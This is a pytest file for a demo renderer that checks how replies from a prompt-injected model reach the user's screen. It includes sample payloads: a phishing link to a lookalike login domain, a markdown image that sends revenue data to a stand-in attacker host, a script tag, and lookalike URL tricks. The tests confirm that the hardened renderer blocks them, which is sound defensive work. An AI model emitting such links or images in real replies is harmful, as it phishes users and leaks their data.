"""Replies a prompt-injected model can produce, and what reaches the user's screen."""

from pathlib import Path

DEMO = Path(__file__).parents[1]

ALLOWED_LINKS = {"docs.example.com", "example.com"}
ALLOWED_IMAGES = {"cdn.example.com"}

PHISH = "Your session expired. [Click here to reauthenticate](https://examp1e-login.com/auth?key=sk-live-123)."
EXFIL = "Here is your summary. ![](https://collect.attacker.net/p.png?d=Q3+revenue+is+4.1M)"
RAW_HTML = "Done.<script>steal()</script>"
GOOD = "See the [refund policy](https://docs.example.com/refunds) ![logo](https://cdn.example.com/logo.png)"


def test_before_renders_the_phishing_link_and_the_exfiltrating_image(load):
    before = load(DEMO / "before" / "render.py", "before_render")
    assert '<a href="https://examp1e-login.com/auth?key=sk-live-123">Click here to reauthenticate</a>' in before.render(PHISH)
    assert '<img alt="" src="https://collect.attacker.net/p.png?d=Q3+revenue+is+4.1M">' in before.render(EXFIL)
    assert "<script>" in before.render(RAW_HTML)


def test_after_unknown_links_show_their_real_destination(load):
    after = load(DEMO / "after" / "render.py", "after_render")
    out = after.render(PHISH, ALLOWED_LINKS, ALLOWED_IMAGES)
    assert "<a " not in out
    assert "Click here to reauthenticate (https://examp1e-login.com/auth?key=sk-live-123)" in out


def test_after_unknown_images_never_load(load):
    after = load(DEMO / "after" / "render.py", "after_render")
    out = after.render(EXFIL, ALLOWED_LINKS, ALLOWED_IMAGES)
    assert "<img" not in out and "attacker.net" not in out


def test_after_raw_html_is_text(load):
    after = load(DEMO / "after" / "render.py", "after_render")
    assert after.render(RAW_HTML, ALLOWED_LINKS, ALLOWED_IMAGES) == "Done.&lt;script&gt;steal()&lt;/script&gt;"


def test_after_allowed_links_and_images_still_work(load):
    after = load(DEMO / "after" / "render.py", "after_render")
    out = after.render(GOOD, ALLOWED_LINKS, ALLOWED_IMAGES)
    assert '<a href="https://docs.example.com/refunds" rel="noopener noreferrer">refund policy</a>' in out
    assert '<img alt="logo" src="https://cdn.example.com/logo.png">' in out


def test_after_lookalike_and_subdomain_tricks_fail(load):
    after = load(DEMO / "after" / "render.py", "after_render")
    for url in ("https://docs.example.com.attacker.net/x", "http://docs.example.com/x", "https://example.com@attacker.net/x"):
        assert "<a " not in after.render(f"[ok]({url})", ALLOWED_LINKS, ALLOWED_IMAGES), url
